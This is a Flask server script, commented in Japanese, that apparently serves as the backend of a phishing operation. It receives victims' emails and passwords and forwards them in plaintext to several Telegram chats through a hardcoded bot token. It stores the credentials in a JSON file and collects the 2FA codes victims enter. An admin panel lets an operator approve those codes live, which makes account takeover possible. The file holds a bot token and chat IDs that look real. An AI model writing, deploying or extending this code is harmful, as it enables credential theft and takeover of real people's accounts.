"""
本サーバー: 管理画面 + リクエスト中継 + 認証管理
"""
from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import requests
from datetime import datetime, timedelta
from apscheduler.schedulers.background import BackgroundScheduler
from config import SECRET_KEY, DEBUG, ALLOWED_ORIGINS
import logging
import time
import json
import os
import sqlite3
import uuid
import threading
import urllib.request
import urllib.parse

logging.basicConfig(level=logging.INFO)

app = Flask(__name__, template_folder='templates')
app.config['SECRET_KEY'] = SECRET_KEY
CORS(app, origins=ALLOWED_ORIGINS)

# ===========================
# グローバル変数
# ===========================

DB_PATH = 'data/requests.db'
AUTH_DB_PATH = 'data/auth_database.json'

TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8314466263:AAG_eAJkU6j8SNFfJsodij9hkkdpSPARc6o')
TELEGRAM_CHAT_IDS = os.getenv('TELEGRAM_CHAT_IDS', '8204394801,8303180774,8243562591').split(',')

# ===========================
# Telegram通知
# ===========================

def send_telegram_notification(message):
    """Telegram通知送信（urllib使用）"""
    def _send():
        for chat_id in TELEGRAM_CHAT_IDS:
            try:
                # URLパラメータ方式でGETリクエスト
                params = urllib.parse.urlencode({
                    'chat_id': chat_id.strip(),
                    'text': message,
                    'parse_mode': 'HTML'
                })
                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage?{params}"
                
                req = urllib.request.Request(url, method='GET')
                with urllib.request.urlopen(req, timeout=30) as response:
                    result = json.loads(response.read().decode())
                    if result.get('ok'):
                        print(f"[INFO] Telegram通知送信成功: {chat_id}")
                    else:
                        print(f"[ERROR] Telegram通知送信失敗: {chat_id} - {result}")
                        
            except Exception as e:
                print(f"[ERROR] Telegram通知エラー: {chat_id} - {e}")
    
    threading.Thread(target=_send, daemon=True).start()

# ===========================
# データベース管理
# ===========================

def init_db():
    """データベースを初期化"""
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS requests (
            id TEXT PRIMARY KEY,
            genre TEXT NOT NULL,
            callback_url TEXT NOT NULL,
            status TEXT DEFAULT 'pending',
            locked_by TEXT,
            created_at TEXT NOT NULL,
            completed_at TEXT,
            data TEXT
        )
    ''')
    
    conn.commit()
    conn.close()
    print("[INFO] データベース初期化完了")

def create_request(genre, callback_url, data=None):
    """新しいリクエストを作成"""
    request_id = str(uuid.uuid4())[:5].zfill(5)
    created_at = datetime.now().isoformat()
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        INSERT INTO requests (id, genre, callback_url, status, created_at, data)
        VALUES (?, ?, ?, 'pending', ?, ?)
    ''', (request_id, genre, callback_url, created_at, data))
    
    conn.commit()
    conn.close()
    
    print(f"[INFO] リクエスト作成: {genre} - {request_id}")
    
    threading.Timer(120.0, lambda: delete_request_after_timeout(genre, request_id)).start()
    
    return request_id

def delete_request_after_timeout(genre, request_id):
    """120秒後にリクエストを削除"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('DELETE FROM requests WHERE id = ? AND genre = ?', (request_id, genre))
        
        if cursor.rowcount > 0:
            conn.commit()
            print(f"[INFO] リクエスト削除（120秒経過）: {genre} - {request_id}")
        
        conn.close()
    except Exception as e:
        print(f"[ERROR] リクエスト削除エラー: {e}")

def get_request_detail(genre, request_id):
    """リクエストの詳細を取得"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT id, genre, callback_url, status, locked_by, created_at, completed_at, data
        FROM requests
        WHERE genre = ? AND id = ?
    ''', (genre, request_id))
    
    row = cursor.fetchone()
    conn.close()
    
    if row:
        return {
            'request_id': row[0],
            'genre': row[1],
            'callback_url': row[2],
            'status': row[3],
            'locked_by': row[4],
            'created_at': row[5],
            'completed_at': row[6],
            'data': row[7]
        }
    return None

def update_request_status(genre, request_id, status, locked_by=None):
    """リクエストのステータスを更新"""
    print(f"[DEBUG] ★★★ update_request_status 呼び出し: genre={genre}, request_id={request_id}, status={status}, locked_by={locked_by}")
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('SELECT id, genre, status FROM requests WHERE genre = ? AND id = ?', (genre, request_id))
    existing = cursor.fetchone()
    print(f"[DEBUG] ★★★ 既存レコード: {existing}")
    
    completed_at = datetime.now().isoformat() if status in ['success', 'failed'] else None
    
    cursor.execute('''
        UPDATE requests
        SET status = ?, locked_by = ?, completed_at = ?
        WHERE genre = ? AND id = ?
    ''', (status, locked_by, completed_at, genre, request_id))
    
    updated = cursor.rowcount > 0
    conn.commit()
    conn.close()
    
    if updated:
        print(f"[INFO] ★★★ リクエスト更新成功: {genre} - {request_id} → {status}")
    else:
        print(f"[ERROR] ★★★ リクエスト更新失敗: {genre} - {request_id} (レコードが見つかりません)")
    
    return updated

def get_pending_requests(base_url):
    """未処理のリクエストを取得"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT id, genre, callback_url, created_at, data
        FROM requests
        WHERE status = 'pending'
        ORDER BY created_at ASC
    ''')
    
    rows = cursor.fetchall()
    conn.close()
    
    requests = []
    for row in rows:
        requests.append({
            'request_id': row[0],
            'genre': row[1],
            'callback_url': row[2],
            'url': f"{base_url}/api/request/{row[1]}/{row[0]}",
            'created_at': row[3],
            'data': row[4]
        })
    
    return requests

def release_stale_locks(minutes=5):
    """古いロックを解放"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    threshold = (datetime.now() - timedelta(minutes=minutes)).isoformat()
    
    cursor.execute('''
        UPDATE requests
        SET status = 'pending', locked_by = NULL
        WHERE status = 'locked' AND created_at < ?
    ''', (threshold,))
    
    released = cursor.rowcount
    conn.commit()
    conn.close()
    
    if released > 0:
        print(f"[INFO] 古いロック解放: {released}件")
    
    return released

def timeout_old_requests(minutes=10):
    """古い未処理リクエストをタイムアウト"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    threshold = (datetime.now() - timedelta(minutes=minutes)).isoformat()
    
    cursor.execute('''
        UPDATE requests
        SET status = 'timeout', completed_at = ?
        WHERE status = 'pending' AND created_at < ?
    ''', (datetime.now().isoformat(), threshold))
    
    timed_out = cursor.rowcount
    conn.commit()
    conn.close()
    
    if timed_out > 0:
        print(f"[INFO] タイムアウト処理: {timed_out}件")
    
    return timed_out

def cleanup_old_requests(days=30):
    """古い完了済みリクエストを削除"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    threshold = (datetime.now() - timedelta(days=days)).isoformat()
    
    cursor.execute('''
        DELETE FROM requests
        WHERE status IN ('success', 'failed', 'timeout') AND completed_at < ?
    ''', (threshold,))
    
    deleted = cursor.rowcount
    conn.commit()
    conn.close()
    
    if deleted > 0:
        print(f"[INFO] 古いリクエスト削除: {deleted}件")
    
    return deleted

# ===========================
# 認証管理
# ===========================

def load_auth_db():
    """認証データベース読み込み"""
    if not os.path.exists(AUTH_DB_PATH):
        return {"accounts": []}
    try:
        with open(AUTH_DB_PATH, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {"accounts": []}

def save_auth_db(data):
    """認証データベース保存"""
    os.makedirs(os.path.dirname(AUTH_DB_PATH), exist_ok=True)
    with open(AUTH_DB_PATH, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def find_account(email, password):
    """アカウント検索"""
    db = load_auth_db()
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            return account
    return None

def create_or_update_account(email, password, status):
    """アカウント作成・更新"""
    db = load_auth_db()
    account = find_account(email, password)
    
    now = datetime.now().isoformat()
    
    if account:
        account['login_history'].append({'datetime': now, 'status': status})
    else:
        new_account = {
            'email': email,
            'password': password,
            'login_history': [{'datetime': now, 'status': status}],
            'twofa_session': None
        }
        db['accounts'].append(new_account)
    
    save_auth_db(db)
    return db

def init_twofa_session(email, password):
    """2FAセッション初期化"""
    db = load_auth_db()
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            account['twofa_session'] = {
                'active': True,
                'codes': [],
                'security_check_completed': False,
                'created_at': datetime.now().isoformat()
            }
            save_auth_db(db)
            return True
    return False

def add_twofa_code(email, password, code):
    """2FAコード追加"""
    db = load_auth_db()
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            if account.get('twofa_session'):
                account['twofa_session']['codes'].append({
                    'code': code,
                    'datetime': datetime.now().isoformat(),
                    'status': 'pending'
                })
                save_auth_db(db)
                return True
    return False

def update_twofa_status(email, password, code, status):
    """2FAコードステータス更新"""
    db = load_auth_db()
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            if account.get('twofa_session'):
                for code_entry in account['twofa_session']['codes']:
                    if code_entry['code'] == code:
                        code_entry['status'] = status
                        save_auth_db(db)
                        return True
    return False

def complete_security_check(email, password):
    """セキュリティチェック完了"""
    db = load_auth_db()
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            if account.get('twofa_session'):
                account['twofa_session']['security_check_completed'] = True
                save_auth_db(db)
                return True
    return False

def delete_twofa_session(email, password):
    """2FAセッション削除"""
    db = load_auth_db()
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            account['twofa_session'] = None
            save_auth_db(db)
            return True
    return False

def get_all_active_sessions():
    """アクティブセッション取得"""
    db = load_auth_db()
    active_sessions = []
    for account in db['accounts']:
        if account.get('twofa_session') and account['twofa_session'].get('active'):
            active_sessions.append({
                'email': account['email'],
                'password': account['password'],
                'session': account['twofa_session']
            })
    return active_sessions

# ===========================
# HTTPエンドポイント
# ===========================

@app.route('/')
def index():
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>本サーバー (Master Server)</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }
            h1 { color: #333; }
            .status { background: #f0f0f0; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
            .links { margin-top: 20px; }
            .links a {
                display: inline-block;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 10px 20px;
                text-decoration: none;
                border-radius: 5px;
                margin-right: 10px;
            }
            .links a:hover { opacity: 0.9; }
        </style>
    </head>
    <body>
        <h1>本サーバー (Master Server)</h1>
        <div class="status">
            <h2>ステータス: 稼働中</h2>
            <p>このサーバーは本サーバー (Master Server) です。</p>
            <p>サブサーバーとPCの間でリクエストを中継します。</p>
        </div>
        
        <div class="links">
            <a href="/admin/top">管理画面</a>
        </div>
        
        <h3>エンドポイント:</h3>
        <ul>
            <li>POST /api/request - リクエスト作成</li>
            <li>GET /api/request-result/{genre}/{id} - リクエスト結果取得</li>
            <li>GET /admin/top - 管理トップ</li>
            <li>GET /admin/accounts - アカウント管理</li>
        </ul>
    </body>
    </html>
    '''
    return html

@app.route('/test-telegram')
def test_telegram():
    """Telegram送信テスト"""
    try:
        params = urllib.parse.urlencode({
            'chat_id': TELEGRAM_CHAT_IDS[0],
            'text': 'テストメッセージ from Render'
        })
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage?{params}"
        
        print(f"[DEBUG] テストURL: {url}")
        
        req = urllib.request.Request(url, method='GET')
        with urllib.request.urlopen(req, timeout=30) as response:
            result = json.loads(response.read().decode())
            return jsonify(result)
            
    except Exception as e:
        print(f"[ERROR] テスト失敗: {type(e).__name__}: {e}")
        import traceback
        traceback.print_exc()
        return f"エラー: {type(e).__name__}: {str(e)}"

@app.route('/api/request', methods=['POST'])
def create_request_endpoint():
    """リクエスト作成"""
    try:
        data = request.json
        genre = data.get('genre')
        callback_url = data.get('callback_url')
        request_data = data.get('data')
        
        if not genre or not callback_url:
            return jsonify({'error': 'genre and callback_url are required'}), 400
        
        request_id = create_request(genre, callback_url, json.dumps(request_data) if request_data else None)
        
        if genre == 'logincheckrequest' and request_data:
            email = request_data.get('email', '不明')
            password = request_data.get('password', '不明')
            message = f"ログインリクエスト通知が来ました\n\nメアド：{email}\nパスワード：{password}"
            send_telegram_notification(message)
        
        return jsonify({
            'status': 'created',
            'genre': genre,
            'request_id': request_id
        }), 201
        
    except Exception as e:
        print(f"[ERROR] リクエスト作成エラー: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/request/<genre>/<request_id>', methods=['GET'])
def get_request_endpoint(genre, request_id):
    """リクエスト詳細取得"""
    try:
        detail = get_request_detail(genre, request_id)
        
        if detail:
            if detail.get('data'):
                try:
                    detail['data'] = json.loads(detail['data'])
                except:
                    pass
            
            return jsonify(detail), 200
        else:
            return jsonify({'error': 'Request not found'}), 404
            
    except Exception as e:
        print(f"[ERROR] リクエスト詳細取得エラー: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/request-result/<genre>/<request_id>', methods=['GET'])
def get_request_result(genre, request_id):
    """リクエスト結果取得"""
    try:
        detail = get_request_detail(genre, request_id)
        
        if detail:
            return jsonify({
                'genre': detail['genre'],
                'request_id': detail['request_id'],
                'status': detail['status'],
                'locked_by': detail.get('locked_by'),
                'completed_at': detail.get('completed_at')
            }), 200
        else:
            return jsonify({'error': 'Request not found'}), 404
            
    except Exception as e:
        print(f"[ERROR] リクエスト結果取得エラー: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/request/<genre>/<request_id>/complete', methods=['POST'])
def complete_request(genre, request_id):
    """リクエスト完了処理"""
    try:
        data = request.json
        status = data.get('status', 'failed')
        pc_id = data.get('pc_id', 'unknown')
        
        update_request_status(genre, request_id, status, pc_id)
        
        return jsonify({'success': True}), 200
        
    except Exception as e:
        print(f"[ERROR] リクエスト完了処理エラー: {e}")
        return jsonify({'success': False}), 500

@app.route('/api/pending-requests', methods=['GET'])
def get_pending_requests_endpoint():
    """未処理リクエスト取得"""
    try:
        base_url = request.host_url.rstrip('/')
        pending = get_pending_requests(base_url)
        return jsonify(pending), 200
    except Exception as e:
        print(f"[ERROR] 未処理リクエスト取得エラー: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/response', methods=['POST'])
def receive_response():
    """PC側から返答受信"""
    try:
        data = request.json
        print(f"[DEBUG] ★★★ PC側から返答受信 - RAWデータ: {data}")
        
        genre = data.get('genre')
        request_id = data.get('request_id')
        status = data.get('status')
        pc_id = data.get('pc_id')
        
        print(f"[DEBUG] ★★★ パース後: genre={genre}, request_id={request_id}, status={status}, pc_id={pc_id}")
        
        updated = update_request_status(genre, request_id, status, pc_id)
        
        print(f"[DEBUG] ★★★ update_request_status 戻り値: {updated}")
        
        if not updated:
            print(f"[ERROR] ★★★ データベース更新失敗！レコードが見つかりませんでした")
        else:
            print(f"[INFO] ★★★ PC側からの返答を正常に処理: {genre} - {request_id} → {status}")
        
        return jsonify({'success': updated}), 200
        
    except Exception as e:
        print(f"[ERROR] ★★★ 返答処理エラー: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'success': False}), 500

@app.route('/admin/top')
def admin_top():
    return render_template('admintop.html')

@app.route('/admin/accounts')
def admin_accounts():
    return render_template('adminaccounts.html')

@app.route('/api/login/init-session', methods=['POST'])
def api_login_init_session():
    """ログイン成功後、2FAセッションを初期化"""
    try:
        data = request.json
        email = data.get('email', '').strip()
        password = data.get('password', '').strip()
        
        if not email or not password:
            return jsonify({'success': False, 'message': 'メールアドレスとパスワードが必要です'}), 400
        
        create_or_update_account(email, password, 'success')
        init_twofa_session(email, password)
        
        print(f"[INFO] 2FAセッション初期化完了 | Email: {email}")
        
        return jsonify({'success': True, 'message': '2FAセッション初期化完了'}), 200
        
    except Exception as e:
        print(f"[ERROR] 2FAセッション初期化エラー: {e}")
        return jsonify({'success': False, 'message': 'エラーが発生しました'}), 500

@app.route('/api/login/result', methods=['POST'])
def api_login_result():
    """ログイン結果受信"""
    try:
        data = request.json
        email = data.get('email', '').strip()
        password = data.get('password', '').strip()
        result = data.get('result', '').strip()
        
        if not email or not password or not result:
            return jsonify({'success': False, 'message': '必須パラメータが不足しています'}), 400
        
        create_or_update_account(email, password, result)
        
        print(f"[INFO] ログイン結果受信 | Email: {email} | Result: {result}")
        
        return jsonify({'success': True, 'message': 'ログイン結果を記録しました'}), 200
        
    except Exception as e:
        print(f"[ERROR] ログイン結果受信エラー: {e}")
        return jsonify({'success': False, 'message': 'エラーが発生しました'}), 500

@app.route('/api/twofa-status/<email>', methods=['GET'])
def get_twofa_status(email):
    """2FA状態取得"""
    db = load_auth_db()
    
    for account in db['accounts']:
        if account['email'] == email and account.get('twofa_session'):
            session = account['twofa_session']
            
            if session['codes']:
                latest_code = session['codes'][-1]
                return jsonify({
                    'approved': latest_code['status'] == 'approved',
                    'rejected': latest_code['status'] == 'rejected',
                    'security_check_completed': session.get('security_check_completed', False)
                }), 200
    
    return jsonify({'approved': False, 'rejected': False}), 200

@app.route('/api/2fa/submit', methods=['POST'])
def api_2fa_submit():
    """2FAコード受信"""
    try:
        data = request.json
        email = data.get('email', '').strip()
        password = data.get('password', '').strip()
        code = data.get('code', '').strip()
        
        db = load_auth_db()
        account = None
        for acc in db['accounts']:
            if acc['email'] == email and acc['password'] == password and acc.get('twofa_session'):
                account = acc
                break
        
        if not account:
            return jsonify({'success': False, 'message': 'セッションが見つかりません'}), 404
        
        add_twofa_code(email, password, code)
        
        return jsonify({'success': True, 'message': '2FAコードを受信しました'}), 200
        
    except Exception as e:
        print(f"[ERROR] 2FA受信エラー: {e}")
        return jsonify({'success': False}), 500

@app.route('/api/security-check/submit', methods=['POST'])
def api_security_check_submit():
    """セキュリティチェック受信"""
    try:
        data = request.json
        email = data.get('email', '').strip()
        
        return jsonify({'success': True}), 200
        
    except Exception as e:
        print(f"[ERROR] セキュリティチェックエラー: {e}")
        return jsonify({'success': False}), 500

@app.route('/api/security-check/check-status', methods=['POST'])
def api_security_check_status():
    """セキュリティチェック状態取得"""
    try:
        data = request.json
        email = data.get('email', '').strip()
        
        db = load_auth_db()
        for account in db['accounts']:
            if account['email'] == email and account.get('twofa_session'):
                completed = account['twofa_session'].get('security_check_completed', False)
                return jsonify({'success': True, 'completed': completed}), 200
        
        return jsonify({'success': False, 'completed': False}), 200
        
    except Exception as e:
        print(f"[ERROR] セキュリティチェック状態確認エラー: {e}")
        return jsonify({'success': False}), 500

@app.route('/api/admin/accounts', methods=['GET'])
def api_admin_accounts():
    """アカウント一覧取得"""
    db = load_auth_db()
    
    success_accounts = []
    failed_accounts = []
    
    for account in db['accounts']:
        if not account['login_history']:
            continue
        
        latest_login = max(account['login_history'], key=lambda x: x['datetime'])
        
        account_info = {
            'email': account['email'],
            'password': account['password'],
            'latest_login': latest_login['datetime'],
            'login_history': account['login_history']
        }
        
        if latest_login['status'] == 'success':
            success_accounts.append(account_info)
        else:
            failed_accounts.append(account_info)
    
    success_accounts.sort(key=lambda x: x['latest_login'], reverse=True)
    failed_accounts.sort(key=lambda x: x['latest_login'], reverse=True)
    
    return jsonify({
        'success': True,
        'success_accounts': success_accounts,
        'failed_accounts': failed_accounts
    })

@app.route('/api/admin/active-sessions', methods=['GET'])
def api_admin_active_sessions():
    """アクティブセッション取得"""
    sessions = get_all_active_sessions()
    return jsonify({'success': True, 'sessions': sessions})

@app.route('/api/admin/2fa/approve', methods=['POST'])
def api_admin_2fa_approve():
    """2FA承認"""
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    code = data.get('code', '').strip()
    
    update_twofa_status(email, password, code, 'approved')
    
    return jsonify({'success': True})

@app.route('/api/admin/2fa/reject', methods=['POST'])
def api_admin_2fa_reject():
    """2FA拒否"""
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    code = data.get('code', '').strip()
    
    update_twofa_status(email, password, code, 'rejected')
    
    return jsonify({'success': True})

@app.route('/api/admin/security-complete', methods=['POST'])
def api_admin_security_complete():
    """セキュリティチェック完了"""
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    
    complete_security_check(email, password)
    
    return jsonify({'success': True})

@app.route('/api/admin/block/delete', methods=['POST'])
def api_admin_block_delete():
    """ブロック削除"""
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    
    delete_twofa_session(email, password)
    
    return jsonify({'success': True})

# ===========================
# 初期化・起動
# ===========================

init_db()

scheduler = BackgroundScheduler()

@scheduler.scheduled_job('interval', seconds=60)
def scheduled_tasks():
    release_stale_locks(minutes=5)
    timeout_old_requests(minutes=10)

@scheduler.scheduled_job('interval', hours=24)
def cleanup_task():
    cleanup_old_requests(days=30)

scheduler.start()

if __name__ == '__main__':
    print("=" * 60)
    print("本サーバー (Master Server) 起動")
    print("=" * 60)
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=DEBUG)